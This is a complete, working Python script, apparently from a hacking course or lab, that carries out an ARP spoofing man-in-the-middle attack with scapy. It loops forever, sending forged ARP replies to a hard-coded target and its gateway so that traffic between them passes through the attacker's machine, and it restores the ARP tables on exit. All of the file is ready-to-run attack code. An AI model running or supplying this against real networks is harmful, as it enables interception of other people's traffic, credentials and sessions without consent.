#!/usr/bin/env python
import time
import sys
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    mac_address = answered_list[0][1].hwsrc
    return mac_address

def spoof(target_ip, spoof_ip): # Go to target and say "Hi I am the 'spoof_ip'"
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.8"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("[+] Packets sent:" + str(sent_packets_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Quitting.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
